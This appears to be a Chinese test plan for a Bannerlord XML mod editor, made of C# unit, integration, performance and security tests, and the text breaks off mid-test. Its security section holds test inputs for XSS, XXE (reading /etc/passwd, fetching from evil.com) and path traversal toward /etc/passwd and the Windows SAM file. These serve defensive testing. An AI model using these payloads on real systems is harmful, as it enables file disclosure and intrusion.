# 骑马与砍杀2 XML格式分析系统 - 全面测试套件

## 测试概述

本文档为骑马与砍杀2游戏XML格式分析系统制定了全面的测试策略和实施方案，确保系统达到95%以上的测试覆盖率。

## 测试架构

### 测试分层结构
```
测试架构
├── 单元测试 (Unit Tests) - 70%
│   ├── XML处理核心测试
│   ├── 数据模型测试
│   ├── 服务层测试
│   └── 工具类测试
├── 集成测试 (Integration Tests) - 15%
│   ├── XML文件处理集成测试
│   ├── DO/DTO转换测试
│   └── 文件发现服务集成测试
├── 端到端测试 (E2E Tests) - 5%
│   ├── 完整工作流测试
│   ├── 用户场景测试
│   └── 错误恢复测试
├── 性能测试 (Performance Tests) - 5%
│   ├── 内存使用测试
│   ├── 大型文件处理测试
│   └── 并发处理测试
└── 安全性测试 (Security Tests) - 5%
    ├── 输入验证测试
    ├── 文件系统安全测试
    └── 数据完整性测试
```

## 1. 单元测试套件

### 1.1 XML处理核心测试

#### 1.1.1 GenericXmlLoader测试
```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/XmlProcessing/GenericXmlLoaderTests.cs
public class GenericXmlLoaderTests
{
    [Theory]
    [InlineData("TestData/action_types.xml", typeof(ActionTypesDO))]
    [InlineData("TestData/combat_parameters.xml", typeof(CombatParametersDO))]
    [InlineData("TestData/skeletons_layout.xml", typeof(SkeletonsLayoutDO))]
    public async Task LoadAsync_ShouldLoadXmlCorrectly(string xmlPath, Type expectedType)
    {
        // Arrange
        var loader = new GenericXmlLoader<DynamicType>();
        var fullPath = Path.Combine(TestContext.CurrentContext.TestDirectory, xmlPath);
        
        // Act
        var result = await loader.LoadAsync(fullPath);
        
        // Assert
        Assert.NotNull(result);
        Assert.IsType(expectedType, result);
    }
    
    [Theory]
    [InlineData("TestData/invalid_xml.xml")]
    [InlineData("TestData/malformed_xml.xml")]
    public async Task LoadAsync_ShouldHandleInvalidXml(string xmlPath)
    {
        // Arrange
        var loader = new GenericXmlLoader<DynamicType>();
        var fullPath = Path.Combine(TestContext.CurrentContext.TestDirectory, xmlPath);
        
        // Act & Assert
        await Assert.ThrowsAsync<XmlException>(() => loader.LoadAsync(fullPath));
    }
    
    [Fact]
    public async Task SaveAsync_ShouldPreserveXmlStructure()
    {
        // Arrange
        var loader = new GenericXmlLoader<ActionTypesDO>();
        var originalPath = GetTestFilePath("action_types.xml");
        var outputPath = CreateTempFile();
        
        // Act
        var original = await loader.LoadAsync(originalPath);
        await loader.SaveAsync(original, outputPath);
        
        // Assert
        var saved = await loader.LoadAsync(outputPath);
        Assert.True(XmlTestUtils.AreStructurallyEqual(original, saved));
    }
}
```

#### 1.1.2 XmlTestUtils测试
```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/XmlProcessing/XmlTestUtilsTests.cs
public class XmlTestUtilsTests
{
    [Fact]
    public void AreStructurallyEqual_ShouldCompareXmlCorrectly()
    {
        // Arrange
        var xml1 = "<root><item id='1'>test</item></root>";
        var xml2 = "<root><item id='1'>test</item></root>";
        var xml3 = "<root><item id='2'>test</item></root>";
        
        // Act & Assert
        Assert.True(XmlTestUtils.AreStructurallyEqual(xml1, xml2));
        Assert.False(XmlTestUtils.AreStructurallyEqual(xml1, xml3));
    }
    
    [Theory]
    [InlineData("true", true)]
    [InlineData("false", false)]
    [InlineData("1", true)]
    [InlineData("0", false)]
    [InlineData("yes", true)]
    [InlineData("no", false)]
    public void ParseBoolean_ShouldHandleVariousFormats(string input, bool expected)
    {
        // Act & Assert
        Assert.Equal(expected, XmlTestUtils.ParseBoolean(input));
    }
    
    [Fact]
    public void GetXmlComplexityScore_ShouldCalculateCorrectly()
    {
        // Arrange
        var simpleXml = "<root><item>test</item></root>";
        var complexXml = "<root><item attr1='1' attr2='2'><subitem><deep>value</deep></subitem></item></root>";
        
        // Act & Assert
        Assert.True(XmlTestUtils.GetXmlComplexityScore(complexXml) > 
                   XmlTestUtils.GetXmlComplexityScore(simpleXml));
    }
}
```

### 1.2 数据模型测试

#### 1.2.1 DO模型测试
```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/Models/DO/ActionTypesDOTests.cs
public class ActionTypesDOTests
{
    [Fact]
    public void ActionTypesDO_ShouldSerializeCorrectly()
    {
        // Arrange
        var actionTypes = new ActionTypesDO
        {
            Actions = new List<ActionTypeDO>
            {
                new ActionTypeDO
                {
                    Name = "test_action",
                    Type = "melee",
                    UsageDirection = "forward",
                    ActionStage = "ready"
                }
            }
        };
        
        // Act
        var xml = XmlTestUtils.Serialize(actionTypes);
        var deserialized = XmlTestUtils.Deserialize<ActionTypesDO>(xml);
        
        // Assert
        Assert.NotNull(deserialized);
        Assert.Single(deserialized.Actions);
        Assert.Equal("test_action", deserialized.Actions[0].Name);
    }
    
    [Fact]
    public void ShouldSerializeMethods_ShouldWorkCorrectly()
    {
        // Arrange
        var action = new ActionTypeDO
        {
            Name = "test",
            Type = null,
            UsageDirection = ""
        };
        
        // Act & Assert
        Assert.True(action.ShouldSerializeName());
        Assert.False(action.ShouldSerializeType());
        Assert.False(action.ShouldSerializeUsageDirection());
    }
}
```

#### 1.2.2 复杂模型测试
```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/Models/DO/CombatParametersDOTests.cs
public class CombatParametersDOTests
{
    [Fact]
    public void CombatParametersDO_ShouldHandleEmptyElements()
    {
        // Arrange
        var xml = @"<combat_parameters>
                        <definitions/>
                        <combat_parameters/>
                    </combat_parameters>";
        
        // Act
        var result = XmlTestUtils.Deserialize<CombatParametersDO>(xml);
        
        // Assert
        Assert.NotNull(result);
        Assert.True(result.HasDefinitions);
        Assert.True(result.HasEmptyCombatParameters);
    }
    
    [Fact]
    public void CombatParametersDO_ShouldSerializeWithEmptyElements()
    {
        // Arrange
        var combatParams = new CombatParametersDO
        {
            HasDefinitions = true,
            HasEmptyCombatParameters = true,
            Definitions = new DefinitionsDO(),
            CombatParametersList = new List<BaseCombatParameterDO>()
        };
        
        // Act
        var xml = XmlTestUtils.Serialize(combatParams);
        
        // Assert
        Assert.Contains("<definitions/>", xml);
        Assert.Contains("<combat_parameters/>", xml);
    }
}
```

### 1.3 服务层测试

#### 1.3.1 FileDiscoveryService测试
```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/Services/FileDiscoveryServiceTests.cs
public class FileDiscoveryServiceTests
{
    [Fact]
    public async Task FindUnadaptedFilesAsync_ShouldDiscoverXmlFiles()
    {
        // Arrange
        var testDataPath = CreateTestDirectoryWithXmlFiles();
        var service = new FileDiscoveryService(testDataPath);
        
        // Act
        var result = await service.FindUnadaptedFilesAsync();
        
        // Assert
        Assert.NotEmpty(result);
        Assert.True(result.Count >= 3); // 至少应该有3个测试文件
        
        var actionTypesFile = result.FirstOrDefault(f => f.FileName.Contains("action_types"));
        Assert.NotNull(actionTypesFile);
        Assert.Equal("high", actionTypesFile.Complexity.ToString().ToLower());
    }
    
    [Fact]
    public async Task GetFileComplexity_ShouldCalculateCorrectly()
    {
        // Arrange
        var service = new FileDiscoveryService("dummy_path");
        var simpleXml = "<root><item>test</item></root>";
        var complexXml = "<root><item attr1='1' attr2='2'><subitem><deep>value</deep></subitem></item></root>";
        
        // Act
        var simpleComplexity = service.GetFileComplexity(simpleXml);
        var complexComplexity = service.GetFileComplexity(complexXml);
        
        // Assert
        Assert.True(complexComplexity > simpleComplexity);
    }
    
    [Fact]
    public async Task GetAdapterStatus_ShouldReturnCorrectStatus()
    {
        // Arrange
        var service = new FileDiscoveryService("dummy_path");
        
        // Act & Assert
        Assert.Equal("adapted", service.GetAdapterStatus("action_types").ToString().ToLower());
        Assert.Equal("not_adapted", service.GetAdapterStatus("unknown_type").ToString().ToLower());
    }
}
```

#### 1.3.2 LargeXmlFileProcessor测试
```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/Services/LargeXmlFileProcessorTests.cs
public class LargeXmlFileProcessorTests
{
    [Fact]
    public async Task ProcessLargeFileAsync_ShouldHandleLargeXml()
    {
        // Arrange
        var largeXml = GenerateLargeXml(10000); // 生成10MB的XML
        var processor = new LargeXmlFileProcessor();
        var filePath = CreateTempFile(largeXml);
        
        // Act
        var result = await processor.ProcessLargeFileAsync(filePath);
        
        // Assert
        Assert.True(result.ProcessedSuccessfully);
        Assert.True(result.ProcessingTimeMs < 30000); // 应该在30秒内完成
        Assert.True(result.MemoryUsageMb < 100); // 内存使用应该小于100MB
    }
    
    [Fact]
    public async Task ProcessInChunks_ShouldWorkCorrectly()
    {
        // Arrange
        var xml = GenerateLargeXml(1000);
        var processor = new LargeXmlFileProcessor();
        var filePath = CreateTempFile(xml);
        
        // Act
        var results = new List<ProcessingResult>();
        await foreach (var chunk in processor.ProcessInChunks(filePath, 100))
        {
            results.Add(chunk);
        }
        
        // Assert
        Assert.True(results.Count > 1); // 应该有多个块
        Assert.All(results, r => Assert.True(r.ProcessedSuccessfully));
    }
}
```

### 1.4 映射器测试

#### 1.4.1 CombatParametersMapper测试
```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/Mappers/CombatParametersMapperTests.cs
public class CombatParametersMapperTests
{
    [Fact]
    public void ToDTO_ShouldMapCorrectly()
    {
        // Arrange
        var source = new CombatParametersDO
        {
            Type = "test_type",
            Definitions = new DefinitionsDO
            {
                Defs = new List<DefDO>
                {
                    new DefDO { Name = "def1", Value = "value1" }
                }
            },
            CombatParametersList = new List<BaseCombatParameterDO>
            {
                new BaseCombatParameterDO { Name = "param1", Value = "value1" }
            }
        };
        
        // Act
        var result = CombatParametersMapper.ToDTO(source);
        
        // Assert
        Assert.NotNull(result);
        Assert.Equal(source.Type, result.Type);
        Assert.NotNull(result.Definitions);
        Assert.Single(result.Definitions.Defs);
        Assert.Single(result.CombatParametersList);
    }
    
    [Fact]
    public void ToDO_ShouldHandleNullInput()
    {
        // Act & Assert
        var result = CombatParametersMapper.ToDO(null);
        Assert.Null(result);
    }
    
    [Fact]
    public void RoundTripMapping_ShouldPreserveData()
    {
        // Arrange
        var original = CreateTestCombatParametersDO();
        
        // Act
        var dto = CombatParametersMapper.ToDTO(original);
        var result = CombatParametersMapper.ToDO(dto);
        
        // Assert
        Assert.True(XmlTestUtils.AreStructurallyEqual(original, result));
    }
}
```

## 2. 集成测试方案

### 2.1 XML处理集成测试

```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/Integration/XmlProcessingIntegrationTests.cs
public class XmlProcessingIntegrationTests
{
    [Fact]
    public async Task CompleteXmlWorkflow_ShouldWorkEndToEnd()
    {
        // Arrange
        var testDataPath = SetupTestDataDirectory();
        var fileDiscoveryService = new FileDiscoveryService(testDataPath);
        var loader = new GenericXmlLoader<ActionTypesDO>();
        
        // Act
        // 1. 发现文件
        var discoveredFiles = await fileDiscoveryService.FindUnadaptedFilesAsync();
        var actionTypesFile = discoveredFiles.First(f => f.FileName.Contains("action_types"));
        
        // 2. 加载XML
        var xmlContent = File.ReadAllText(actionTypesFile.FullPath);
        var actionTypes = await loader.LoadAsync(actionTypesFile.FullPath);
        
        // 3. 修改数据
        actionTypes.Actions.Add(new ActionTypeDO
        {
            Name = "new_action",
            Type = "ranged"
        });
        
        // 4. 保存XML
        var outputPath = Path.Combine(testDataPath, "modified_action_types.xml");
        await loader.SaveAsync(actionTypes, outputPath, xmlContent);
        
        // 5. 验证结果
        var modifiedActionTypes = await loader.LoadAsync(outputPath);
        
        // Assert
        Assert.True(actionTypes.Actions.Count + 1 == modifiedActionTypes.Actions.Count);
        Assert.Contains(modifiedActionTypes.Actions, a => a.Name == "new_action");
    }
    
    [Fact]
    public async Task MultipleXmlTypes_ShouldProcessCorrectly()
    {
        // Arrange
        var testDataPath = SetupTestDataDirectory();
        var fileDiscoveryService = new FileDiscoveryService(testDataPath);
        
        // Act
        var discoveredFiles = await fileDiscoveryService.FindUnadaptedFilesAsync();
        var processingTasks = new List<Task>();
        
        foreach (var file in discoveredFiles.Take(5)) // 处理前5个文件
        {
            processingTasks.Add(ProcessXmlFile(file));
        }
        
        await Task.WhenAll(processingTasks);
        
        // Assert
        Assert.All(processingTasks, task => Assert.True(task.IsCompletedSuccessfully));
    }
    
    private async Task ProcessXmlFile(UnadaptedFile file)
    {
        var loader = CreateLoaderForFileType(file.FileName);
        var xmlContent = File.ReadAllText(file.FullPath);
        var obj = await loader.LoadDynamicAsync(file.FullPath);
        var outputPath = file.FullPath + ".processed";
        await loader.SaveDynamicAsync(obj, outputPath, xmlContent);
        
        Assert.True(File.Exists(outputPath));
    }
}
```

### 2.2 DO/DTO转换集成测试

```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/Integration/DoDtoIntegrationTests.cs
public class DoDtoIntegrationTests
{
    [Theory]
    [InlineData(typeof(ActionTypesDO), typeof(ActionTypesDTO))]
    [InlineData(typeof(CombatParametersDO), typeof(CombatParametersDTO))]
    [InlineData(typeof(BannerIconsDO), typeof(BannerIconsDTO))]
    public async Task DoDtoRoundTrip_ShouldPreserveData(Type doType, Type dtoType)
    {
        // Arrange
        var original = CreateTestObject(doType);
        var mapperType = GetMapperType(doType);
        var mapper = Activator.CreateInstance(mapperType);
        
        // Act
        var toDtoMethod = mapperType.GetMethod("ToDTO", new[] { doType });
        var dto = toDtoMethod.Invoke(mapper, new[] { original });
        
        var toDoMethod = mapperType.GetMethod("ToDo", new[] { dtoType });
        var result = toDoMethod.Invoke(mapper, new[] { dto });
        
        // Assert
        Assert.True(XmlTestUtils.AreStructurallyEqual(original, result));
    }
    
    [Fact]
    public async Task MultipleMappers_ShouldWorkConsistently()
    {
        // Arrange
        var testObjects = CreateTestObjectsForAllMappers();
        
        // Act
        var results = new List<object>();
        foreach (var obj in testObjects)
        {
            var result = await ProcessThroughMapper(obj);
            results.Add(result);
        }
        
        // Assert
        Assert.Equal(testObjects.Count, results.Count);
        for (int i = 0; i < testObjects.Count; i++)
        {
            Assert.True(XmlTestUtils.AreStructurallyEqual(testObjects[i], results[i]));
        }
    }
}
```

## 3. 端到端测试场景

### 3.1 完整工作流测试

```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/E2E/CompleteWorkflowTests.cs
public class CompleteWorkflowTests
{
    [Fact]
    public async Task FullModEditingWorkflow_ShouldWorkCorrectly()
    {
        // Arrange - 设置测试环境
        var testEnvironment = await SetupTestEnvironmentAsync();
        
        try
        {
            // Act - 执行完整工作流
            
            // 1. 扫描和发现XML文件
            var discoveryResult = await testEnvironment.FileDiscoveryService.FindUnadaptedFilesAsync();
            Assert.NotEmpty(discoveryResult);
            
            // 2. 选择并加载复杂的XML文件
            var complexFile = discoveryResult.First(f => f.Complexity == FileComplexity.High);
            var loader = testEnvironment.XmlLoaderFactory.CreateLoader(complexFile.FileName);
            var originalXml = await File.ReadAllTextAsync(complexFile.FullPath);
            var originalObject = await loader.LoadDynamicAsync(complexFile.FullPath);
            
            // 3. 修改XML数据
            var modifier = testEnvironment.XmlModifierFactory.CreateModifier(complexFile.FileName);
            var modifiedObject = await modifier.ModifyAsync(originalObject);
            
            // 4. 验证修改结果
            var validationResult = await testEnvironment.XmlValidator.ValidateAsync(modifiedObject);
            Assert.True(validationResult.IsValid);
            
            // 5. 保存修改后的XML
            var outputPath = Path.Combine(testEnvironment.WorkingDirectory, "modified_" + Path.GetFileName(complexFile.FileName));
            await loader.SaveDynamicAsync(modifiedObject, outputPath, originalXml);
            
            // 6. 验证往返一致性
            var roundTripObject = await loader.LoadDynamicAsync(outputPath);
            var roundTripValidation = await testEnvironment.XmlValidator.ValidateRoundTripAsync(originalObject, roundTripObject);
            Assert.True(roundTripValidation.IsConsistent);
            
            // 7. 性能监控
            var performanceMetrics = testEnvironment.PerformanceMonitor.GetMetrics();
            Assert.True(performanceMetrics.TotalProcessingTimeMs < 5000); // 5秒内完成
            Assert.True(performanceMetrics.PeakMemoryUsageMb < 50); // 内存使用小于50MB
            
            // Assert - 所有步骤都成功完成
            Assert.True(File.Exists(outputPath));
            Assert.True(validationResult.IsValid);
            Assert.True(roundTripValidation.IsConsistent);
        }
        finally
        {
            // Cleanup
            await testEnvironment.CleanupAsync();
        }
    }
    
    [Fact]
    public async Task ErrorRecoveryWorkflow_ShouldHandleGracefully()
    {
        // Arrange
        var testEnvironment = await SetupTestEnvironmentAsync();
        var corruptedXmlPath = CreateCorruptedXmlFile(testEnvironment.WorkingDirectory);
        
        try
        {
            // Act
            var recoveryResult = await testEnvironment.ErrorRecoveryService.RecoverAsync(corruptedXmlPath);
            
            // Assert
            Assert.NotNull(recoveryResult);
            Assert.True(recoveryResult.RecoverySuccessful);
            Assert.NotNull(recoveryResult.RecoveredObject);
            Assert.NotEmpty(recoveryResult.RecoveryLog);
            
            // 验证恢复的文件可以被正常处理
            var loader = testEnvironment.XmlLoaderFactory.CreateGenericLoader();
            var recoveredObject = await loader.LoadDynamicAsync(recoveryResult.RecoveredFilePath);
            Assert.NotNull(recoveredObject);
        }
        finally
        {
            await testEnvironment.CleanupAsync();
        }
    }
}
```

### 3.2 用户场景测试

```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/E2E/UserScenarioTests.cs
public class UserScenarioTests
{
    [Theory]
    [InlineData("beginner_user", "simple_modification")]
    [InlineData("advanced_user", "complex_modification")]
    [InlineData("power_user", "batch_modification")]
    public async Task UserScenario_ShouldWorkForDifferentUserTypes(string userType, string scenarioType)
    {
        // Arrange
        var scenario = await SetupUserScenarioAsync(userType, scenarioType);
        
        try
        {
            // Act
            var result = await scenario.ExecuteAsync();
            
            // Assert
            Assert.True(result.Success);
            Assert.True(result.UserSatisfaction >= scenario.ExpectedSatisfaction);
            Assert.True(result.CompletionTime <= scenario.MaxAllowedTime);
            
            // 记录用户体验指标
            scenario.RecordUserExperience(result);
        }
        finally
        {
            await scenario.CleanupAsync();
        }
    }
    
    [Fact]
    public async Task LargeDatasetProcessing_ShouldHandleEfficiently()
    {
        // Arrange
        var largeDataset = await SetupLargeDatasetAsync();
        
        try
        {
            // Act
            var stopwatch = Stopwatch.StartNew();
            var results = new List<ProcessingResult>();
            
            await foreach (var result in largeDataset.ProcessInParallelAsync())
            {
                results.Add(result);
            }
            
            stopwatch.Stop();
            
            // Assert
            Assert.True(results.Count == largeDataset.ExpectedFileCount);
            Assert.True(results.All(r => r.Success));
            Assert.True(stopwatch.ElapsedMilliseconds < largeDataset.MaxProcessingTimeMs);
            
            // 验证内存使用
            var memoryMetrics = largeDataset.GetMemoryMetrics();
            Assert.True(memoryMetrics.PeakMemoryUsageMb < largeDataset.MaxMemoryUsageMb);
        }
        finally
        {
            await largeDataset.CleanupAsync();
        }
    }
}
```

## 4. 性能和负载测试

### 4.1 内存使用测试

```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/Performance/MemoryUsageTests.cs
public class MemoryUsageTests
{
    [Theory]
    [InlineData(100, "small")]
    [InlineData(1000, "medium")]
    [InlineData(10000, "large")]
    public async Task XmlProcessing_ShouldUseMemoryEfficiently(int elementCount, string sizeCategory)
    {
        // Arrange
        var testXml = GenerateTestXml(elementCount);
        var memoryMonitor = new MemoryMonitor();
        var loader = new GenericXmlLoader<DynamicType>();
        
        // Act
        memoryMonitor.StartMonitoring();
        
        var initialMemory = memoryMonitor.GetCurrentMemoryUsage();
        var result = await loader.LoadDynamicAsync(CreateTempFile(testXml));
        
        // 强制垃圾回收
        GC.Collect();
        GC.WaitForPendingFinalizers();
        
        var finalMemory = memoryMonitor.GetCurrentMemoryUsage();
        memoryMonitor.StopMonitoring();
        
        var memoryIncrease = finalMemory - initialMemory;
        var memoryMetrics = memoryMonitor.GetMetrics();
        
        // Assert
        var expectedMaxMemory = sizeCategory switch
        {
            "small" => 10 * 1024 * 1024, // 10MB
            "medium" => 50 * 1024 * 1024, // 50MB
            "large" => 200 * 1024 * 1024, // 200MB
            _ => throw new ArgumentException("Unknown size category")
        };
        
        Assert.True(memoryIncrease < expectedMaxMemory, 
            $"Memory usage for {sizeCategory} file should be less than {expectedMaxMemory / (1024 * 1024)}MB");
        
        Assert.True(memoryMetrics.MaxMemoryUsage < expectedMaxMemory);
        Assert.True(memoryMetrics.AverageMemoryUsage < expectedMaxMemory * 0.8);
    }
    
    [Fact]
    public async Task LargeFileProcessing_ShouldNotCauseMemoryLeaks()
    {
        // Arrange
        var largeFiles = GenerateTestFiles(10, 50000); // 10个50K元素的文件
        var memoryMonitor = new MemoryMonitor();
        
        try
        {
            // Act
            memoryMonitor.StartMonitoring();
            
            var initialMemory = memoryMonitor.GetCurrentMemoryUsage();
            
            foreach (var file in largeFiles)
            {
                var loader = new GenericXmlLoader<DynamicType>();
                var result = await loader.LoadDynamicAsync(file.Path);
                
                // 模拟处理完成后释放资源
                loader = null;
                result = null;
                GC.Collect();
                GC.WaitForPendingFinalizers();
            }
            
            var finalMemory = memoryMonitor.GetCurrentMemoryUsage();
            memoryMonitor.StopMonitoring();
            
            var memoryIncrease = finalMemory - initialMemory;
            var memoryMetrics = memoryMonitor.GetMetrics();
            
            // Assert
            Assert.True(memoryIncrease < 50 * 1024 * 1024, // 50MB
                "Processing multiple large files should not cause significant memory increase");
            
            Assert.True(memoryMetrics.MemoryLeakDetected == false,
                "No memory leaks should be detected");
        }
        finally
        {
            CleanupTestFiles(largeFiles);
        }
    }
}
```

### 4.2 并发处理测试

```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/Performance/ConcurrencyTests.cs
public class ConcurrencyTests
{
    [Theory]
    [InlineData(1, 100)]
    [InlineData(5, 100)]
    [InlineData(10, 100)]
    [InlineData(20, 100)]
    public async Task ConcurrentProcessing_ShouldWorkCorrectly(int concurrentThreads, int filesPerThread)
    {
        // Arrange
        var testFiles = GenerateTestFiles(concurrentThreads * filesPerThread, 1000);
        var processor = new ConcurrentXmlProcessor();
        var cts = new CancellationTokenSource();
        
        try
        {
            // Act
            var stopwatch = Stopwatch.StartNew();
            var results = await processor.ProcessConcurrentlyAsync(testFiles, concurrentThreads, cts.Token);
            stopwatch.Stop();
            
            // Assert
            Assert.Equal(testFiles.Count, results.Count);
            Assert.All(results, r => Assert.True(r.Success));
            
            // 性能断言
            var singleThreadTime = EstimateSingleThreadTime(testFiles.Count);
            var speedup = singleThreadTime / stopwatch.ElapsedMilliseconds;
            var expectedSpeedup = Math.Min(concurrentThreads * 0.7, concurrentThreads); // 考虑并行开销
            
            Assert.True(speedup >= expectedSpeedup * 0.5, 
                $"Concurrent processing should provide at least 50% of expected speedup. Actual: {speedup:F2}x, Expected: {expectedSpeedup:F2}x");
            
            // 记录性能指标
            var performanceMetrics = new PerformanceMetrics
            {
                ConcurrentThreads = concurrentThreads,
                TotalFiles = testFiles.Count,
                TotalTimeMs = stopwatch.ElapsedMilliseconds,
                Speedup = speedup,
                MemoryUsageMb = GetCurrentMemoryUsage()
            };
            
            LogPerformanceMetrics(performanceMetrics);
        }
        finally
        {
            cts.Cancel();
            CleanupTestFiles(testFiles);
        }
    }
    
    [Fact]
    public async Task LoadTesting_ShouldHandleHighLoad()
    {
        // Arrange
        var loadTestConfig = new LoadTestConfig
        {
            Duration = TimeSpan.FromMinutes(5),
            MaxConcurrentRequests = 50,
            RequestRate = 10 // 每秒10个请求
        };
        
        var loadTester = new LoadTester(loadTestConfig);
        var testScenarios = CreateLoadTestScenarios();
        
        try
        {
            // Act
            var loadTestResult = await loadTester.ExecuteLoadTestAsync(testScenarios);
            
            // Assert
            Assert.True(loadTestResult.SuccessRate >= 0.95, 
                "Success rate should be at least 95%");
            
            Assert.True(loadTestResult.AverageResponseTimeMs < 1000, 
                "Average response time should be less than 1 second");
            
            Assert.True(loadTestResult.P95ResponseTimeMs < 5000, 
                "95th percentile response time should be less than 5 seconds");
            
            Assert.True(loadTestResult.ErrorRate < 0.05, 
                "Error rate should be less than 5%");
            
            // 内存使用检查
            Assert.True(loadTestResult.PeakMemoryUsageMb < 500, 
                "Peak memory usage should be less than 500MB");
            
            // 输出负载测试报告
            GenerateLoadTestReport(loadTestResult);
        }
        finally
        {
            await loadTester.CleanupAsync();
        }
    }
}
```

## 5. 安全性测试

### 5.1 输入验证测试

```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/Security/InputValidationTests.cs
public class InputValidationTests
{
    [Theory]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("javascript:alert('xss')")]
    [InlineData("<img src='x' onerror='alert(1)'>")]
    [InlineData("<svg onload=alert('XSS')>")]
    public async Task XmlProcessing_ShouldPreventXssAttacks(string maliciousInput)
    {
        // Arrange
        var maliciousXml = $"<root><item>{maliciousInput}</item></root>";
        var loader = new GenericXmlLoader<DynamicType>();
        var securityValidator = new SecurityValidator();
        
        try
        {
            // Act
            var result = await loader.LoadDynamicAsync(CreateTempFile(maliciousXml));
            
            // Assert
            Assert.NotNull(result);
            
            // 验证输出中不包含恶意脚本
            var serializedOutput = XmlTestUtils.Serialize(result);
            Assert.DoesNotContain("script", serializedOutput);
            Assert.DoesNotContain("javascript:", serializedOutput);
            Assert.DoesNotContain("onerror", serializedOutput);
            Assert.DoesNotContain("onload", serializedOutput);
            
            // 安全验证
            var validationResult = securityValidator.ValidateXmlSecurity(serializedOutput);
            Assert.True(validationResult.IsSecure);
        }
        finally
        {
            CleanupTempFile();
        }
    }
    
    [Theory]
    [InlineData("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>")]
    [InlineData("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"http://evil.com/malicious.dtd\">]>\n<root>&xxe;</root>")]
    public async Task XmlProcessing_ShouldPreventXxeAttacks(string maliciousXml)
    {
        // Arrange
        var loader = new GenericXmlLoader<DynamicType>();
        var securityValidator = new SecurityValidator();
        
        try
        {
            // Act & Assert
            await Assert.ThrowsAsync<XmlException>(() => 
                loader.LoadDynamicAsync(CreateTempFile(maliciousXml)));
        }
        finally
        {
            CleanupTempFile();
        }
    }
    
    [Theory]
    [InlineData("<root><item><![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?><malicious>content</malicious>]]></item></root>")]
    [InlineData("<root><item><!-- malicious comment --></item></root>")]
    [InlineData("<root><item><?processing-instruction malicious-content?></item></root>")]
    public async Task XmlProcessing_ShouldHandleSpecialXmlConstructs(string xmlContent)
    {
        // Arrange
        var loader = new GenericXmlLoader<DynamicType>();
        var securityValidator = new SecurityValidator();
        
        try
        {
            // Act
            var result = await loader.LoadDynamicAsync(CreateTempFile(xmlContent));
            
            // Assert
            Assert.NotNull(result);
            
            var serializedOutput = XmlTestUtils.Serialize(result);
            var validationResult = securityValidator.ValidateXmlSecurity(serializedOutput);
            
            Assert.True(validationResult.IsSecure);
            Assert.True(validationResult.ContainsNoMaliciousContent);
        }
        finally
        {
            CleanupTempFile();
        }
    }
}
```

### 5.2 文件系统安全测试

```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/Security/FileSystemSecurityTests.cs
public class FileSystemSecurityTests
{
    [Fact]
    public async Task FileDiscoveryService_ShouldRespectDirectoryBoundaries()
    {
        // Arrange
        var safeDirectory = CreateTestDirectory();
        var maliciousFilePath = Path.Combine(safeDirectory, "..", "..", "sensitive_file.txt");
        
        try
        {
            // 创建尝试路径遍历的文件
            Directory.CreateDirectory(Path.GetDirectoryName(maliciousFilePath));
            await File.WriteAllTextAsync(maliciousFilePath, "sensitive content");
            
            var fileDiscoveryService = new FileDiscoveryService(safeDirectory);
            
            // Act
            var discoveredFiles = await fileDiscoveryService.FindUnadaptedFilesAsync();
            
            // Assert
            Assert.DoesNotContain(discoveredFiles, f => f.FullPath.Contains("sensitive_file"));
            Assert.All(discoveredFiles, f => Assert.True(f.FullPath.StartsWith(safeDirectory)));
        }
        finally
        {
            CleanupTestDirectory(safeDirectory);
            if (File.Exists(maliciousFilePath))
            {
                File.Delete(maliciousFilePath);
            }
        }
    }
    
    [Theory]
    [InlineData("../../../secret.xml")]
    [InlineData("..\\..\\secret.xml")]
    [InlineData("/etc/passwd")]
    [InlineData("C:\\Windows\\System32\\config\\sam")]
    public async Task XmlLoader_ShouldRejectPathTraversalAttempts(string maliciousPath)
    {
        // Arrange
        var loader = new GenericXmlLoader<DynamicType>();
        
        // Act & Assert
        await Assert.ThrowsAsync<ArgumentException>(() => 
            loader.LoadDynamicAsync(maliciousPath));
    }
    
    [Fact]
    public async Task FileOperations_ShouldHaveProperPermissions()
    {
        // Arrange
        var testFile = CreateTempFile("<root><item>test</item></root>");
        var loader = new GenericXmlLoader<DynamicType>();
        
        try
        {
            // Act
            await loader.LoadDynamicAsync(testFile);
            
            // Assert - 检查文件权限
            var fileInfo = new FileInfo(testFile);
            Assert.True(fileInfo.Exists);
            
            // 验证文件权限（在支持的平台上）
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || 
                RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
            {
                var filePermissions = GetFilePermissions(testFile);
                Assert.True(filePermissions.HasFlag(FilePermissions.UserRead));
                Assert.True(filePermissions.HasFlag(FilePermissions.UserWrite));
                Assert.False(filePermissions.HasFlag(FilePermissions.GroupWrite));
                Assert.False(filePermissions.HasFlag(FilePermissions.OtherWrite));
            }
        }
        finally
        {
            CleanupTempFile();
        }
    }
}
```

## 6. 兼容性测试

### 6.1 跨平台兼容性测试

```csharp
// 测试文件路径: BannerlordModEditor.Common.Tests/Compatibility/CrossPlatformTests.cs
public class CrossPlatformTests
{
    [Theory]
    [InlineData("Windows")]
    [InlineData("Linux")]
    [InlineData("macOS")]
    public async Task XmlProcessing_ShouldWorkOnAllPlatforms(string platform)
    {
        // Arrange
        var testXml = GetPlatformSpecificTestXml(platform);
        var testFile = CreateTempFile(testXml);
        var loader = new GenericXmlLoader<DynamicType>();
        
        try
        {
